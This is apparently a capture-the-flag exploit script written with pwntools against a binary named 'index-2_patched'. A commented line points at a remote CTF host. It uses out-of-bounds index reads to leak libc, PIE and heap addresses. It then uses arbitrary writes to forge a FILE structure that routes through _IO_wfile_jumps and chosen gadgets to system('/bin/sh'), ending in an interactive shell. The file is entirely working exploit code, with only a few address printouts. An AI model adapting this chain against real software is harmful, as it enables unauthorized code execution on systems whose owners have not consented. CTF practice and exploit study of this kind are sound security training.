from pwn import *

context.binary = binary = ELF('./index-2_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def calculate_idx(address):
	return (address - binary.symbols.nums) // 8

def r(idx):
	p.sendlineafter(b'Exit\n', b'2')
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.recvuntil(b'Data: ')
	return p.recvuntil(b'1.')[:-2]

def w(idx, data):
	assert(len(data)) <= 8
	p.sendlineafter(b'Exit\n', b'1')
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.sendafter(b'Data: ', data)
	p.sendline(b'1')

p = process()
#p = remote('play.scriptsorcerers.xyz', 10458)

libc_leak = u64(r(-4).ljust(8, b'\x00'))
libc.address = libc_leak - libc.symbols._IO_2_1_stderr_
print(f'libc leak @ {hex(libc_leak)}')
print(f'libc base @ {hex(libc.address)}')

pie_leak = u64(r(-11).ljust(8, b'\x00'))
binary.address = pie_leak - 0x4008
print(f'pie leak @ {hex(pie_leak)}')
print(f'pie base @ {hex(binary.address)}')

p.sendlineafter(b'Exit\n', b'1337')
f = u64(r(8).ljust(8, b'\x00'))
heap_base = f &~ 0xfff
print(f'f @ {hex(f)}')
print(f'heap base @ {hex(heap_base)}')

w(calculate_idx(f), p64(0))
w(calculate_idx(f+0x10), p64(f+0x18))
w(calculate_idx(f+0x18), b'/bin/sh\x00')
w(calculate_idx(f+0x20), p64(libc.symbols.system))
w(calculate_idx(f+0x28), p64(libc.symbols.system+1))
w(calculate_idx(f+0x68), p64(libc.address+0x8f54f)) # mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x380]
w(calculate_idx(heap_base+0x378), p64(libc.symbols._IO_wfile_jumps))
w(calculate_idx(heap_base+0x380+0x2a0), p64(libc.address+0x14adba)) # call qword ptr [rax + 0x20]
w(calculate_idx(heap_base+0x470), p64(f))

p.sendlineafter(b'Exit\n', b'4')
p.clean()
print('*** SHELL ***')
p.interactive()
